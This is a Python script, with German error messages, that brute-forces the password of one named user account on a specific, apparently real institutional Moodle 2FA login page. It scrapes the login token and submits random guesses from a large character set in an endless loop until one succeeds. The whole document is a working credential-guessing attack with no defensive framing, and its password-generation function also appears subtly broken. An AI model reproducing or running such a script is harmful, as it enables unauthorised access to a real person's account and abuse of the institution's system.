import requests
import re
import math
import random 
from itertools import combinations
import sys
url = "https://moodle2.helmholtz-karlsruhe.de/moodle/blocks/exa2fa/login/"
loginTokenRegex = re.compile('type="hidden" name="logintoken" value="(\w*)"', re.IGNORECASE)

def check(username, password):
    req = requests.session()
    req.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"})
    res = req.get(url)
    if res.status_code == 200:
        Ltoken = loginTokenRegex.search(res.text).group(1)
        res2 = req.post(url, data={
            "ajax": True,
            "anchor": "",
            "logintoken": Ltoken,
            "username": username,
            "password": password,
            "token": "",
        })
        if res2.status_code == 200:
            err = res2.json()["error"]
            if err == "":
                return True
            else:
                print(err)
                return False
        else:
            print("Fehler LOL2")
            print(res2)
            return False
    else:
        print("Fehler LOL3"+ res.status_code) 
        return False
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW1234567890,.-#+^°!"§$%&/()=?{[]}\\;:_\'*~'
charlenght = len(chars)
def numtostring(num):
    return chars[num % charlenght] + numtostring(math.floor(num / charlenght)) if num >= charlenght else ""
while True:
    passwd = numtostring(math.floor(random.random() * math.pow(charlenght, 6)))
    if check("schellpa",passwd):
        print(passwd)
        sys.exit()
        